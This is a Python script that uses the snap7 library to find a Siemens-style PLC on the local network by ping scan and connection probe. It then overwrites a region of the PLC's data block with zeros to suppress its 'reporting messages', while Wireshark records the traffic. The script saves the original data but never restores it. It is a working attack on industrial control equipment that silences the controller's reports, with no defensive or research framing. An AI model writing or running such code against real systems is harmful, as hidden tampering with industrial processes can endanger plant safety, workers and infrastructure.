import snap7
import socket
import struct
import time
import os
import subprocess

# Configuration - Adjust these values based on your specific setup
PLC_IP = None  # Initially unknown, will be discovered
PLC_RACK = 0
PLC_SLOT = 1
DB_NUMBER = 1  # Example: Adjust based on the data block containing reporting messages
START_ADDRESS = 0  # Example: Starting byte address within the DB
DATA_LENGTH = 10  # Example: Number of bytes to block (length of the reporting message)

# Network interface to use for Wireshark capture (e.g., "Ethernet", "Wi-Fi")
WIRESHARK_INTERFACE = "Ethernet"  # Change this to your network interface

# Path to Wireshark executable
WIRESHARK_PATH = "C:\\Program Files\\Wireshark\\wireshark.exe"  # Adjust path if needed

def find_plc_ip():
    """
    Discovers the PLC's IP address by scanning the network.
    This is a rudimentary approach and might not work in all network configurations.
    It relies on the PLC responding to a simple ping.  More robust discovery methods
    might be needed for complex networks.
    """
    global PLC_IP  # Access the global variable to update it
    
    print("Attempting to discover PLC IP address...")
    
    # Get the IP address and subnet mask of the current machine
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        print(f"Host IP Address: {ip_address}")
        
        # Determine the network address and subnet mask from ipconfig command
        ipconfig_result = subprocess.check_output(["ipconfig", "/all"]).decode("utf-8")
        
        # Extract IPv4 Address and Subnet Mask using string search
        ip_address_line = next((line for line in ipconfig_result.splitlines() if "IPv4 Address" in line), None)
        subnet_mask_line = next((line for line in ipconfig_result.splitlines() if "Subnet Mask" in line), None)
        
        if ip_address_line and subnet_mask_line:
            ip_address = ip_address_line.split(":")[1].strip()
            subnet_mask = subnet_mask_line.split(":")[1].strip()
            print(f"Host IP Address: {ip_address}")
            print(f"Subnet Mask: {subnet_mask}")
        else:
            print("Failed to retrieve IPv4 Address or Subnet Mask from ipconfig.")
            return None
        
    except Exception as e:
        print(f"Error getting network information: {e}")
        return None

    # Calculate the network address
    try:
        ip_int = struct.unpack("!I", socket.inet_aton(ip_address))[0]
        mask_int = struct.unpack("!I", socket.inet_aton(subnet_mask))[0]
        network_int = ip_int & mask_int
        network_address = socket.inet_ntoa(struct.pack("!I", network_int))
    
    except Exception as e:
        print(f"Error calculating network address: {e}")
        return None

    # Ping scan the network for the PLC (This is a very basic approach!)
    # A more robust solution would use nmap or similar.
    network_prefix = ".".join(network_address.split(".")[:3]) + "."

    for i in range(1, 255):  # Check addresses from .1 to .254
        target_ip = network_prefix + str(i)
        try:
            # Use ping command (cross-platform)
            ping_reply = subprocess.call(['ping', '-n', '1', '-w', '100', target_ip],  # -n 1 (send 1 packet), -w 100 (timeout 100ms)
                                         stdout=subprocess.DEVNULL,  # Suppress output
                                         stderr=subprocess.DEVNULL)

            if ping_reply == 0:  # 0 means ping was successful
                print(f"Ping successful to: {target_ip}")
                
                # Try connecting with Snap7 to confirm it's a PLC
                try:
                    plc = snap7.client.Client()
                    plc.connect(target_ip, PLC_RACK, PLC_SLOT)
                    if plc.get_connected():
                        print(f"PLC found at IP address: {target_ip}")
                        PLC_IP = target_ip
                        plc.disconnect()  # Disconnect immediately after confirmation
                        return True
                    else:
                        print(f"Ping successful to {target_ip} but not a Snap7 PLC")
                        plc.disconnect()
                except Exception as e:
                    print(f"Ping successful to {target_ip} but not a Snap7 PLC: {e}")
        except Exception as e:
            print(f"Error pinging {target_ip}: {e}")
            
    print("PLC IP address not found on the network using this simple ping scan.")
    return False  # PLC not found



def block_reporting_messages(plc_ip, rack, slot, db_number, start_address, data_length):
    """
    Blocks reporting messages by overwriting the data in the PLC's DB.
    This function now uses Wireshark to capture traffic during the blocking operation.
    """

    try:
        # 1. Start Wireshark Capture
        print("Starting Wireshark capture...")
        capture_file = "plc_communication.pcapng" # Or .pcap if you need older format
        wireshark_command = [
            WIRESHARK_PATH,
            "-i", WIRESHARK_INTERFACE,  # Specify the network interface
            "-f", f"host {plc_ip}",  # Capture only traffic to/from the PLC
            "-w", capture_file,        # Write capture to file
            "-k"                       # Start capturing immediately
        ]

        wireshark_process = subprocess.Popen(wireshark_command) # Run Wireshark in the background
        time.sleep(2)  # Give Wireshark a moment to start

        # 2. Connect to the PLC
        plc = snap7.client.Client()
        plc.connect(plc_ip, rack, slot)

        # 3. Read the original data (for restoration later, optional, but good practice)
        original_data = plc.db_read(db_number, start_address, data_length)

        # 4. Overwrite with zeros (or other blocking pattern)
        print(f"Blocking reporting messages in DB{db_number}, address {start_address}, length {data_length}...")
        zeros = bytearray([0] * data_length)  # Create a bytearray of zeros
        plc.db_write(db_number, start_address, zeros)
        print("Reporting messages blocked.")


    except Exception as e:
        print(f"Error blocking reporting messages: {e}")

    finally:
        # 5. Disconnect from the PLC and Stop Wireshark (Important!)
        try:
            if plc.get_connected(): # Check if connected before disconnecting
                plc.disconnect()
            print("Disconnected from PLC.")
        except Exception as e:
            print(f"Error disconnecting from PLC: {e}")


        print("Stopping Wireshark capture...")
        #Try to gracefully terminate Wireshark
        try:
            wireshark_process.terminate()
            wireshark_process.wait(timeout=5) # Wait for 5 seconds to terminate
        except subprocess.TimeoutExpired:
            print("Wireshark did not terminate gracefully, killing it...")
            wireshark_process.kill()

        print(f"Wireshark capture saved to: {capture_file}")
        print("Done.")


if __name__ == "__main__":
    if PLC_IP is None:
        if not find_plc_ip():
            print("Could not find PLC IP address.  Please configure PLC_IP manually.")
            exit()
    
    print(f"Using PLC IP Address: {PLC_IP}")
    block_reporting_messages(PLC_IP, PLC_RACK, PLC_SLOT, DB_NUMBER, START_ADDRESS, DATA_LENGTH)